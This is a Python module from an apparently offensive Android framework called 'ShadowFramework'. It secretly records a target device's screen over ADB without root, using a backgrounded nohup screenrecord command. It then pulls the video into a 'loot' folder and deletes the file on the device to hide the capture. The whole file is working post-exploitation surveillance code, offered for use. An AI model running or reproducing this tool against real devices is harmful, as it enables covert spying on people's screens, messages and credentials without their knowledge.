"""
ShadowFramework — Screen Recorder (Non-Root)
Uses ADB screenrecord + scrcpy-style capture. Fully functional.
"""
import subprocess
import time
import os
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=None):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1

class Module:
    MODULE_INFO = {
        'name': 'post/android/screen_recorder_non_root',
        'description': 'Records screen via ADB screenrecord (no root). Pulls MP4 to loot.',
        'options': {
            'DEVICE_ID': 'Target device serial (run: adb devices)',
            'DURATION':  'Recording duration in seconds [default: 15]',
            'OUTPUT':    'Local output path [default: loot/screen_capture.mp4]',
            'BITRATE':   'Video bitrate [default: 4000000]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        duration  = int(self.framework.options.get('DURATION', '15'))
        output    = self.framework.options.get('OUTPUT', 'loot/screen_capture.mp4')
        bitrate   = self.framework.options.get('BITRATE', '4000000')

        # Resolve device
        if not device_id:
            out, _, _ = _adb('', 'devices')
            # Fallback: get first device
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device connected. Set DEVICE_ID.[/red]")
            return

        remote_path = '/data/local/tmp/shadow_rec.mp4'
        Path(output).parent.mkdir(parents=True, exist_ok=True)

        # Clean up any previous recording
        _adb(device_id, 'shell', 'rm', '-f', remote_path)

        console.print(f"[cyan][*] Starting screenrecord on {device_id} ({duration}s, bitrate {bitrate})...[/cyan]")
        log_action(f"Screen recording started on {device_id} for {duration}s")

        # Launch screenrecord in background on device using shell nohup
        # We use 'shell' with the full command as a single string to handle backgrounding
        record_cmd = f'nohup screenrecord --time-limit {duration} --bit-rate {bitrate} {remote_path} > /dev/null 2>&1 &'
        _adb(device_id, 'shell', record_cmd)

        # Wait for recording to complete + buffer
        console.print(f"[yellow][*] Recording in progress... waiting {duration + 2}s[/yellow]")
        time.sleep(duration + 2)

        # Verify the file exists on device
        out, _, _ = _adb(device_id, 'shell', 'ls', '-la', remote_path)
        if remote_path not in out and 'No such file' in out:
            console.print("[red][!] Recording failed — screenrecord may not be available on this device.[/red]")
            return

        # Pull to local machine
        console.print(f"[cyan][*] Pulling recording to {output}...[/cyan]")
        _, err, rc = _adb(device_id, 'pull', remote_path, output)
        if rc != 0:
            console.print(f"[red][!] Pull failed: {err}[/red]")
            return

        # Verify local file
        if os.path.exists(output) and os.path.getsize(output) > 1000:
            size_mb = os.path.getsize(output) / (1024 * 1024)
            console.print(f"[bold green][+] Recording saved: {output} ({size_mb:.1f} MB)[/bold green]")
            log_action(f"Screen recording saved: {output} ({size_mb:.1f}MB)")
        else:
            console.print("[red][!] Output file is empty or too small. Recording may have failed.[/red]")

        # Cleanup on device
        _adb(device_id, 'shell', 'rm', '-f', remote_path)
        console.print("[dim]  Remote file cleaned up.[/dim]")
